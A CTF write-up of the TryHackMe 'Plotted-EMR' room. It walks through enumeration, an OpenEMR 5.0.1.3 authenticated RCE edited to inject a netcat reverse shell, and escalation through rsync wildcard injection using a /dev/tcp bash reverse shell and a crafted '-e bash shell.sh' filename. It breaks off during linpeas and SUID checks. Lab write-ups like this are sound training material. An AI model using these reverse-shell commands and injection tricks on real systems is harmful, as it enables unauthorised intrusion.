<h1 align="center">Plotted-EMR</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/c73c4e43-529b-43a1-9cdd-57930a7382db"><br>
2025, September 6<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>488</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Everything here is plotted!</em>.<br>
Access it <a href="https://tryhackme.com/room/plottedemr"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/5435d3e6-1f99-429a-8f3e-2636a5c19fdb"></p>

<h2>Task 1 . Introduction</h2>
<p>Happy Hunting!<br>

Note: This machine may take up to 5 mins to start its services fully.<br>

Tip: Enumeration is key!</p>

<p><em>Answer the question below</em></p>

<p>1.1. Ready<br>
<code>No answer needed</code></p>

<h2>Task 2 . Compromise</h2>

<p><em>Answer the questions below</em></p>


<h2>nikto</h2>

```bash
:~# nikto -h xx.xxx.xx.xxx
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          xx.xxx.xx.xx
+ Target Hostname:    plotted
+ Target Port:        80
+ Start Time:         2025-09-06 xx:xx:xx (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa6 0x5ce84b74611ab 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, HEAD, GET, POST 
+ OSVDB-3092: /passwd: This could be interesting...
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-09-06 xx:xx:xx (GMT1) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<h2>nmap</h2>

<p>

- 21 : FTP<br>
- 22 : SSH<br>
- 80 : HTTP : Apache httpd 2.4.41 ((Ubuntu))<br>
- 5900 : mysql : MySQL 5.5.5-10.3.31-MariaDB-0+deb10u1<br>
- 8890 : HTTP : Apache httpd 2.4.41 ((Ubuntu))</p>

```bash
:~# nmap -sT -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
5900/tcp open  vnc
8890/tcp open  ddi-tcp-3
```

```bash
:~# nmap -sC -sV -p- -T4 xx.xxx.xx.xxx
...
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xx.xxx.xx.xxx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5900/tcp open  mysql   MySQL 5.5.5-10.3.31-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.31-MariaDB-0+deb10u1
|   Thread ID: 44
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSigpipes, SupportsTransactions, ConnectWithDatabase, DontAllowDatabaseTableColumn, ODBCClient, FoundRows, InteractiveClient, SupportsCompression, LongColumnFlag, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: :-ry(Yi&zX(]~#/b!zel
|_  Auth Plugin Name: mysql_native_password
8890/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

<h2>gobuster</h2>

```bash
:~# gobuster dir -u http://xx.xxx.xx.xxx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60
...
/admin                (Status: 200) [Size: 33]
/shadow               (Status: 200) [Size: 61]
/passwd               (Status: 200) [Size: 61]
/server-status        (Status: 403) [Size: 278]
```

```bash
:~# gobuster dir --url http://xx.xxx.xx.xxx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
...
/index.html           (Status: 200) [Size: 10918]
/admin                (Status: 200) [Size: 33]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/shadow               (Status: 200) [Size: 61]
/passwd               (Status: 200) [Size: 61]
/server-status        (Status: 403) [Size: 278]
```

<br>

```bash
:~# gobuster dir -u http://xx.xxx.xx.xxx:8890/ -w /usr/share/dirb/wordlists/common.txt
...
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10918]
/portal               (Status: 301) [Size: 322] [--> http://xx.xxx.xx.xxx:8890/portal/]
/server-status        (Status: 403) [Size: 280]
```

```bash
:~# gobuster dir -u http://xx.xxx.xx.xxx:8890/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60
...
/portal               (Status: 301) [Size: 322] [--> http://xx.xxx.xx.xxx:8890/portal/]
/80                   (Status: 301) [Size: 318] [--> http://xx.xxx.xx.xxx:8890/80/]
/server-status        (Status: 403) [Size: 280]
Progress: 218275 / 218276 (100.00%)
```

```bash
:~# gobuster dir --url http://xx.xxx.xx.xxx:8890/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
...
/index.html           (Status: 200) [Size: 10918]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/portal               (Status: 301) [Size: 322] [--> http://xx.xxx.xx.xxx:8890/portal/]
/80                   (Status: 301) [Size: 318] [--> http://xx.xxx.xx.xxx:8890/80/]
/server-status        (Status: 403) [Size: 280]
```

```bash
:~# gobuster dir --url http://xx.xxx.xx.xxx:8890/portal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
===============================================================
Gobuster v3.6
...
===============================================================
/.html                (Status: 403) [Size: 280]
/index.php            (Status: 302) [Size: 0] [--> interface/login/login.php?site=default]
/.php                 (Status: 403) [Size: 280]
/templates            (Status: 301) [Size: 332] [--> http://xx.xxx.xx.xxx:8890/portal/templates/]
/services             (Status: 301) [Size: 331] [--> http://xx.xxx.xx.xxx:8890/portal/services/]
/modules              (Status: 301) [Size: 330] [--> http://xx.xxx.xx.xxx:8890/portal/modules/]
/common               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/common/]
/library              (Status: 301) [Size: 330] [--> http://xx.xxx.xx.xxx:8890/portal/library/]
/public               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/public/]
/version.php          (Status: 200) [Size: 0]
/admin.php            (Status: 200) [Size: 1124]
/portal               (Status: 403) [Size: 280]
/tests                (Status: 301) [Size: 328] [--> http://xx.xxx.xx.xxx:8890/portal/tests/]
/sites                (Status: 301) [Size: 328] [--> http://xx.xxx.xx.xxx:8890/portal/sites/]
/images               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/images/]
/custom               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/custom/]
/contrib              (Status: 301) [Size: 330] [--> http://xx.xxx.xx.xxx:8890/portal/contrib/]
/interface            (Status: 301) [Size: 332] [--> http://xx.xxx.xx.xxx:8890/portal/interface/]
/vendor               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/vendor/]
/config               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/config/]
/setup.php            (Status: 200) [Size: 1214]
/Documentation        (Status: 301) [Size: 336] [--> http://xx.xxx.xx.xxx:8890/portal/Documentation/]
/sql                  (Status: 301) [Size: 326] [--> http://xx.xxx.xx.xxx:8890/portal/sql/]
/controller.php       (Status: 403) [Size: 280]
/LICENSE              (Status: 200) [Size: 35147]
/ci                   (Status: 301) [Size: 325] [--> http://xx.xxx.xx.xxx:8890/portal/ci/]
/cloud                (Status: 301) [Size: 328] [--> http://xx.xxx.xx.xxx:8890/portal/cloud/]
/ccr                  (Status: 301) [Size: 326] [--> http://xx.xxx.xx.xxx:8890/portal/ccr/]
/patients             (Status: 301) [Size: 331] [--> http://xx.xxx.xx.xxx:8890/portal/patients/]
/repositories         (Status: 301) [Size: 335] [--> http://xx.xxx.xx.xxx:8890/portal/repositories/]
/myportal             (Status: 301) [Size: 331] [--> http://xx.xxx.xx.xxx:8890/portal/myportal/]
/entities             (Status: 301) [Size: 331] [--> http://xx.xxx.xx.xxx:8890/portal/entities/]
/controllers          (Status: 301) [Size: 334]
```

```bash
:~# gobuster dir -u http://xx.xxx.xx.xxx:8890/portal/ -w /usr/share/dirb/wordlists/common.txt
...
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/common               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/common/]
/config               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/config/]
/contrib              (Status: 301) [Size: 330] [--> http://xx.xxx.xx.xxx:8890/portal/contrib/]
/controllers          (Status: 301) [Size: 334] [--> http://xx.xxx.xx.xxx:8890/portal/controllers/]
/custom               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/custom/]
/images               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/images/]
/index.php            (Status: 302) [Size: 0] [--> interface/login/login.php?site=default]
/interface            (Status: 301) [Size: 332] [--> http://xx.xxx.xx.xxx:8890/portal/interface/]
/LICENSE              (Status: 200) [Size: 35147]
/admin.php            (Status: 200) [Size: 937]
/services             (Status: 301) [Size: 331] [--> http://xx.xxx.xx.xxx:8890/portal/services/]
/modules              (Status: 301) [Size: 330] [--> http://xx.xxx.xx.xxx:8890/portal/modules/]
/public               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/public/]
/portal               (Status: 403) [Size: 280]
/library              (Status: 301) [Size: 330] [--> http://xx.xxx.xx.xxx:8890/portal/library/]
/sites                (Status: 301) [Size: 328] [--> http://xx.xxx.xx.xxx:8890/portal/sites/]
/sql                  (Status: 301) [Size: 326] [--> http://xx.xxx.xx.xxx:8890/portal/sql/]
/templates            (Status: 301) [Size: 332] [--> http://xx.xxx.xx.xxx:8890/portal/templates/]
/tests                (Status: 301) [Size: 328] [--> http://xx.xxx.xx.xxx:8890/portal/tests/]
/vendor               (Status: 301) [Size: 329] [--> http://xx.xxx.xx.xxx:8890/portal/vendor/]
```


<h2>FTP</h2>

```bash
:~# ftp xx.xxx.xx.xxx
Connected to xx.xxx.xx.xxx.
220 (vsFTPd 3.0.3)
Name (xx.xxx.xx.xxx:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 ftp      ftp          4096 Oct 17  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Oct 17  2021 .-
dr-xr-xr-x    3 ftp      ftp          4096 Oct 17  2021 ..
226 Directory send OK.
ftp> cd .
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 ftp      ftp          4096 Oct 17  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Oct 17  2021 .-
dr-xr-xr-x    3 ftp      ftp          4096 Oct 17  2021 ..
226 Directory send OK.
ftp> cd .-
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Oct 17  2021 .
dr-xr-xr-x    3 ftp      ftp          4096 Oct 17  2021 ..
drwxr-xr-x    2 ftp      ftp          4096 Oct 17  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Oct 17  2021 .
drwxr-xr-x    3 ftp      ftp          4096 Oct 17  2021 ..
-rw-r--r--    1 ftp      ftp           178 Oct 17  2021 you_are_determined.txt
226 Directory send OK.
ftp> get you_are_determined.txt
local: you_are_determined.txt remote: you_are_determined.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for you_are_determined.txt (178 bytes).
226 Transfer complete.
178 bytes received in 0.00 secs (73.8124 kB/s)
ftp> bye
221 Goodbye.
```

<h2>you_are_determined.txt</h2>

```bash
:~# file you_are_determined.txt
you_are_determined.txt: ASCII text
```

```bash
:~# cat you_are_determined.txt
Sorry, but you wasted your time!

Here is something for you :D
https://www.youtube.com/watch?v=dQw4w9WgXcQ

Wait..I'll give you a hint: see if you can access the `admin` account
```

<h2>mysql</h2>

```bash
:~# apt install mariadb-client-core-10.3
```

```bash
:~# mysql -h 10.201.14.189 -u admin -P 5900
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 47
Server version: 10.3.31-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

<h2>/admin</h2>

```bash
:~# curl -s http://10.201.14.189/admin
dGhpcyBtaWdodCBiZSBhIHVzZXJuYW1l
```

```bash
:~# curl -s http://10.201.14.189/admin | base64 -d
this might be a username
```

<h2>/index.html</h2>h2>

<img width="1090" height="259" alt="image" src="https://github.com/user-attachments/assets/43f146b4-d2f5-4e3e-88d4-47b6a1883a77" />


<h2>/passwd</h2>h2>

```bash
aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==
```

<img width="1078" height="152" alt="image" src="https://github.com/user-attachments/assets/e53282c2-105b-4227-9385-97e25a3afb44" />

```bash
:~# curl -s http://xx.xxx.xx.xxx/passwd | base64 -d
https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

<h2>/shadowM/h2>

```bash
aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1kUXc0dzlXZ1hjUQ==
```

<img width="1059" height="174" alt="image" src="https://github.com/user-attachments/assets/32c6d88b-a3ea-4756-b9c9-ec416b9a745a" />

```bash
:~# curl -s http://xx.xxx.xx.xxx/shadow | base64 -d
https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

<h2>:8890</h2>h2>

<img width="1040" height="270" alt="image" src="https://github.com/user-attachments/assets/1daf10f3-2bba-4883-9593-4317c9ab3267" />

<p>
  
- :8890/portal/ --> http://xx.xxx.xx.xxx:8890/portal/interface/login/login.php?site=default</p>

<img width="1092" height="568" alt="image" src="https://github.com/user-attachments/assets/a5cf41f7-47d6-4018-be01-8367f342c345" />

<h2>:8890/portal/admin.php</h2>
<p>

- OpenEMR 5.0.1 (3)</p>

<img width="1131" height="239" alt="image" src="https://github.com/user-attachments/assets/6b5e9ffb-3f80-4ca2-a547-b7c1192c4520" />

<h2>searchsploit</h2>

```bash
:~# searchsploit openEMR -s 5.0.1
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 5.0.1 - 'controller' Remote Code Execution                                                      | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                                               | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                                               | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)                             | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)                         | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                                                | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                                                 | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                                                 | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                                             | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)                                         | php/webapps/50087.rb
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
:~# searchsploit -m php/webapps/45161.py
  Exploit: OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/45161
     Path: /opt/exploitdb/exploits/php/webapps/45161.py
    Codes: N/A
 Verified: True
File Type: ASCII text
Copied to: /root/45161.py
```

<h2>:8890/portal/admin.php</h2>

<p>

- Add New Site<br>
- Site ID: hey<br>
- Continue<br>
- Continue<br>
- Have setup create the database<br>
- Continue<br>
- updated some fields<br>
- Password: Password123! <br>
- Server Hosts:xx.xxx.xx.xxx<br>
- Server Port: 4900<br>
- Login Name: emengarda<br>
- Name for Root Account: admin<br>
- Use Hostname: xx.xxx.xx.xxx<br>
- OPENEMR USER:
- Initial User: admin
- Intial User Password: Password123!<br>
- Continue<br>
- COntinue<br>
- COntinue</p>


<img width="1132" height="365" alt="image" src="https://github.com/user-attachments/assets/1bf9435d-7069-410d-96eb-9682ac63cbd7" />

<img width="1129" height="266" alt="image" src="https://github.com/user-attachments/assets/2398f67a-1efd-4136-b1b4-76635c2225a1" />

<img width="1135" height="283" alt="image" src="https://github.com/user-attachments/assets/04a410e2-ff7d-4ba2-93c7-de5fe599ac03" />

<img width="1136" height="757" alt="image" src="https://github.com/user-attachments/assets/72a67c76-4833-4ce1-b4d0-d2f81ebb0873" />

<img width="1144" height="749" alt="image" src="https://github.com/user-attachments/assets/c9262d40-5a50-41f3-bc78-4b60b77a4a36" />

<br>
<h2>OpenEMR Setup, Step 3</h2>

<img width="1122" height="330" alt="image" src="https://github.com/user-attachments/assets/5585b489-6a15-41a0-bafa-8a24588c4bd1" />

<br>
<h2>OpenEMR Setup, Step 4</h2>

<img width="1121" height="460" alt="image" src="https://github.com/user-attachments/assets/0efdb847-0a6f-4ae8-9ea6-e3911e294dbd" />

<br>
<h2>OpenEMR Setup, Step 5</h2>
<p>

- Your php.ini file can be found at /etc/php/7.4/apache2/php.ini
</p>

<img width="1128" height="528" alt="image" src="https://github.com/user-attachments/assets/a11c0c39-27fe-4e2a-97cf-07853a7c7ae7" />

<br>
<h2>OpenEMR Setup, Step 6</h2>

<img width="1127" height="624" alt="image" src="https://github.com/user-attachments/assets/81af2aac-3950-49e8-a795-13764c2ee9c5" />

<br>
<h2>OpenEMR Setup</h2>
<p>

- Click here to start using OpenEM</p>

<img width="1129" height="419" alt="image" src="https://github.com/user-attachments/assets/88dcc515-6235-48df-ad10-4e4ee96fe6e8" />

<br>
<h2>OpenEMR Product Registration</h2>
<p>
- email<br>
- No Thanks</p>

<img width="1115" height="254" alt="image" src="https://github.com/user-attachments/assets/0427b47c-9d48-4f23-80a1-f2867b1a7d72" />

<br>
<h2>Finally .... </h2>
<p>

- http://xx.xxx.xx.xxx:8890/portal/interface/login/login.php?site=hey</p>

<img width="1127" height="587" alt="image" src="https://github.com/user-attachments/assets/efb9c129-b9be-4472-9944-a601075b76b4" />

<img width="1132" height="582" alt="image" src="https://github.com/user-attachments/assets/746ca8b7-d6d1-48c9-9fcc-2380f55b0d11" />

<img width="1132" height="582" alt="image" src="https://github.com/user-attachments/assets/68443259-8885-44e7-9356-bbad2c00b214" />

<img width="1127" height="648" alt="image" src="https://github.com/user-attachments/assets/91beba91-94db-4699-9eda-b92c924afa87" />

<br>
<h2>edited 41161.py</h2>


```bash
    print(load + "Authenticating with " + args.user + ":" + args.password)
    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=hey", data=login)
    if "login_screen.php?error=1&site=" in r.text:
        print(err + "Failed to Login.")
        sys.exit(0)
```

```bash
    # Linux only, but can be easily modified for Windows.
    _cmd = "|| echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc /xx.xxx.xx.xxx 1234 >/tmp/f' |bash"  
    p.update({"form_284": _cmd})
```

<h2>Exploit</h2>

```bash
:~# python3 45161.py http://xx.xxx.xx.xxx:8890/portal -u 'admin' -p '************'
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:Password123!
[$] Injecting payload
```

<h2>www-data</h2>

```bash
:~# nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on xx.xxx.xx.xxx 46430
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/html/portal/interface/main
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@plotted:/var/www/html/portal/interface/main$ ^Z
[1]+  Stopped                 nc -nlvp 1234
:~# stty raw -echo; fg
nc -nlvp 1234

```bash
www-data@plotted:/var/www/html/portal/interface/main$ export TERM=xterm
www-data@plotted:/var/www/html/portal/interface/main$ 
```

```bash
www-data@plotted:/var/www$ ls -lah
total 16K
drwxr-xr-x  3 root     root     4.0K Oct 17  2021 .
drwxr-xr-x 15 root     root     4.0K Oct 17  2021 ..
-rw-r--r--  1 www-data www-data   27 Oct 17  2021 ThisFileIsInteresting
drwxr-xr-x  4 root     root     4.0K Oct 17  2021 html
```

```bash
www-data@plotted:/var/www$ file ThisFileIsInteresting
ThisFileIsInteresting: ASCII text
www-data@plotted:/var/www$ cat ThisFileIsInteresting
Flag1 : ******************
```

<p>2.1. What is flag 1?<br>
<code>******************</code</p>


```bash
www-data@plotted:/var/www$ ps aux

<h2>Cronjob</h2>h2>
<p>
- plot_admin cd /var/www/html/portal/config && rsync -t * plot_admin@127.0.0.1:~/backup
</p>

```bash
www-data@plotted:/etc$ cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * 	* * * 	plot_admin cd /var/www/html/portal/config && rsync -t * plot_admin@127.0.0.1:~/backup
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

```bash
www-data@plotted:/home$ ls
plot_admin  ubuntu
www-data@plotted:/home$ cd plot_admin
www-data@plotted:/home/plot_admin$ ls -lah
total 48K
drwxr-xr-x 6 plot_admin plot_admin 4.0K Oct 24  2021 .
drwxr-xr-x 4 root       root       4.0K Oct 17  2021 ..
-rw------- 1 plot_admin plot_admin   28 Oct 25  2021 .bash_history
-rw-r--r-- 1 plot_admin plot_admin  220 Oct 17  2021 .bash_logout
-rw-r--r-- 1 plot_admin plot_admin 3.7K Oct 17  2021 .bashrc
drwx------ 2 plot_admin plot_admin 4.0K Oct 17  2021 .cache
drwxrwxr-x 3 plot_admin plot_admin 4.0K Oct 17  2021 .local
-rw-r--r-- 1 plot_admin plot_admin  807 Oct 17  2021 .profile
-rw-rw-r-- 1 plot_admin plot_admin   66 Oct 24  2021 .selected_editor
drwx------ 2 plot_admin plot_admin 4.0K Oct 17  2021 .ssh
drwxr-xr-x 2 plot_admin plot_admin 4.0K Oct 26  2021 backup
-r-------- 1 plot_admin plot_admin   33 Oct 17  2021 user.txt
```

```bash
www-data@plotted:/home/plot_admin/backup$ ls -lah
total 8.0K
drwxr-xr-x 2 plot_admin plot_admin 4.0K Oct 26  2021 .
drwxr-xr-x 6 plot_admin plot_admin 4.0K Oct 24  2021 ..
```

```bash
www-data@plotted:/var/www/html/portal/config$ cat shell.sh
bash -c 'exec bash -i &>/dev/tcp/xx.xxx.xx.xxx/4444 <&1'
```

```bash
www-data@plotted:/var/www/html/portal/config$ ls -lah
total 24K
drwxrwxr-x  2 www-data www-data 4.0K Sep  6 14:17 .
drwxrwxr-x 31 www-data www-data 4.0K Oct 25  2021 ..
-rw-rw-r--  1 www-data www-data 4.2K May 28  2018 config.yaml
-rw-rw-r--  1 www-data www-data  428 May 28  2018 services.yml
-rw-r--r--  1 www-data www-data   57 Sep  6 14:17 shell.sh
```


```bash
/tcp/xx.xxx.xx.xxx/4444 <&1'" > shell.sh
www-data@plotted:/var/www/html/portal/config$ ls -lah
total 24K
drwxrwxr-x  2 www-data www-data 4.0K Sep  6 14:17 .
drwxrwxr-x 31 www-data www-data 4.0K Oct 25  2021 ..
-rw-rw-r--  1 www-data www-data 4.2K May 28  2018 config.yaml
-rw-rw-r--  1 www-data www-data  428 May 28  2018 services.yml
-rw-r--r--  1 www-data www-data   57 Sep  6 14:17 shell.sh
www-data@plotted:/var/www/html/portal/config$ cat shell.sh
bash -c 'exec bash -i &>/dev/tcp/xx.xxx.xx.xxx/4444 <&1'
www-data@plotted:/var/www/html/portal/config$ touch -- '-e bash shell.sh'
www-data@plotted:/var/www/html/portal/config$ ls
'-e bash shell.sh'   config.yaml   services.yml   shell.sh
www-data@plotted:/var/www/html/portal/config$ cat '-e bash shell.sh'
cat: invalid option -- ' '
Try 'cat --help' for more information.
```

<h2>plot_admin</h2>

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xxx 46106
bash: cannot set terminal process group (3848): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted:/var/www/html/portal/config$ id
id
uid=1001(plot_admin) gid=1001(plot_admin) groups=1001(plot_admin)
plot_admin@plotted:/var/www/html/portal/config$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<fig$ python3 -c 'import pty;pty.spawn("/bin/bash")'
plot_admin@plotted:/var/www/html/portal/config$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~# stty raw -echo; fg
nc -nlvp 4444

```bash
plot_admin@plotted:/var/www/html/portal/config$ export TERM=xterm
```



```bash
plot_admin@plotted:/home$ cd plot_admin
plot_admin@plotted:~$ ls -lah
total 48K
drwxr-xr-x 6 plot_admin plot_admin 4.0K Oct 24  2021 .
drwxr-xr-x 4 root       root       4.0K Oct 17  2021 ..
drwxr-xr-x 2 plot_admin plot_admin 4.0K Oct 26  2021 backup
-rw------- 1 plot_admin plot_admin   28 Oct 25  2021 .bash_history
-rw-r--r-- 1 plot_admin plot_admin  220 Oct 17  2021 .bash_logout
-rw-r--r-- 1 plot_admin plot_admin 3.7K Oct 17  2021 .bashrc
drwx------ 2 plot_admin plot_admin 4.0K Oct 17  2021 .cache
drwxrwxr-x 3 plot_admin plot_admin 4.0K Oct 17  2021 .local
-rw-r--r-- 1 plot_admin plot_admin  807 Oct 17  2021 .profile
-rw-rw-r-- 1 plot_admin plot_admin   66 Oct 24  2021 .selected_editor
drwx------ 2 plot_admin plot_admin 4.0K Oct 17  2021 .ssh
-r-------- 1 plot_admin plot_admin   33 Oct 17  2021 user.txt
```


<p>2.2. What is user.txt<br>
<code>*****************************</code></p>

<h2></h2>


<h2>linpeas.sh</h2>

```bash
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/mqueue/linpeas.txt
/dev/shm
/etc/passwd
/etc/shadow
/home/plot_admin
/root
/root/root.txt
/run/lock
/run/screen
/run/screen/S-plot_admin
/snap/core18/2128/tmp
/snap/core18/2128/var/tmp
/snap/core18/2284/tmp
/snap/core18/2284/var/tmp
/snap/core20/1169/run/lock
/snap/core20/1169/tmp
/snap/core20/1169/var/tmp
/snap/core20/1328/run/lock
/snap/core20/1328/tmp
/snap/core20/1328/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1001
/tmp/.X11-unix
/tmp/.XIM-unix
/var/backups/plot_admin
/var/backups/plot_admin/files
/var/backups/plot_admin/logs.txt
/var/crash
/var/lib/php/sessions
/var/tmp
/var/www/html/portal/sites/default/sqlconf.php
```


```bash
plot_admin@plotted:~$ find / -user root -perm -4000 -print 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
